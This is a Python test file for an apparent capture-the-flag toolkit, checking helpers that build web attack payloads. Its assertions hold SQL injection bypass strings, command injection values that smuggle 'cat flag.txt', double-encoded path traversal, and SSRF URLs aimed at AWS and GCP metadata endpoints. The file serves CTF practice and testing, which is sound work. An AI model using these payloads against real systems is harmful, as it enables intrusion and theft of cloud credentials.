from __future__ import annotations

from ctf_toolkit.web.helpers import (
    build_command_injection_payload,
    build_lfi_traversal_path,
    build_sqli_auth_bypass,
    build_ssrf_metadata_url,
)


def test_build_sqli_auth_bypass() -> None:
    payload = build_sqli_auth_bypass(username="admin", technique="or_true")
    assert payload == "admin' --"
    payload2 = build_sqli_auth_bypass(technique="or_1_equals_1")
    assert payload2 == "' OR 1=1 --"


def test_build_command_injection_payload() -> None:
    p1 = build_command_injection_payload("127.0.0.1", ";", "cat flag.txt")
    assert p1 == "127.0.0.1; cat flag.txt"
    p2 = build_command_injection_payload("127.0.0.1", "subshell", "cat flag.txt")
    assert p2 == "127.0.0.1 $(cat flag.txt)"
    p3 = build_command_injection_payload("127.0.0.1", "newline", "cat flag.txt")
    assert p3 == "127.0.0.1\ncat flag.txt"


def test_build_lfi_traversal_path() -> None:
    path = build_lfi_traversal_path("flag.txt", depth=3)
    assert path == "../../../flag.txt"
    path_double = build_lfi_traversal_path("flag.txt", depth=2, double_encode=True)
    assert path_double == "%252e%252e%252f%252e%252e%252fflag.txt"


def test_build_ssrf_metadata_url() -> None:
    aws = build_ssrf_metadata_url("aws")
    assert "169.254.169.254" in aws
    gcp = build_ssrf_metadata_url("gcp")
    assert "metadata.google.internal" in gcp
